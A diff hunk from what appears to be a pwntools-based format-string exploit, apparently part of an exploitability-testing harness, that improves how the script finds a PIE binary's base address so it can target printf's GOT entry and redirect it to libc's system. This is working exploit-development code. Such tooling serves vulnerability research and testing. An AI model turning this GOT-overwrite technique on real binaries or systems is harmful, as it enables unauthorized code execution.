@@ -34,9 +34,19 @@ libc = io.libc; system = libc.symbols["system"]
 pie_base = 0
 if elf.pie:
     import os as _os
-    for path, base in (io.libs() or {}).items():
-        if _os.path.basename(path) == _os.path.basename(name):
+    bn = _os.path.basename(name)
+    for path, base in (io.libs() or {}).items():       # 1) pwntools' own mapping
+        if _os.path.basename(path) == bn:
             pie_base = base; break
+    if not pie_base:                                     # 2) /proc/<pid>/maps (lowest mapping)
+        try:
+            addrs = [int(l.split("-")[0], 16) for l in open("/proc/%d/maps" % io.pid) if bn in l]
+            if addrs:
+                pie_base = min(addrs) & ~0xfff
+        except Exception:
+            pass
+    if not pie_base:
+        pie_base = 0x555555554000                        # 3) standard ASLR-off PIE base
 printf_got = elf.got["printf"] + pie_base
 MARK = b"BINORACLE_FMT_PWNED"
 for wsz in ("short", "byte"):
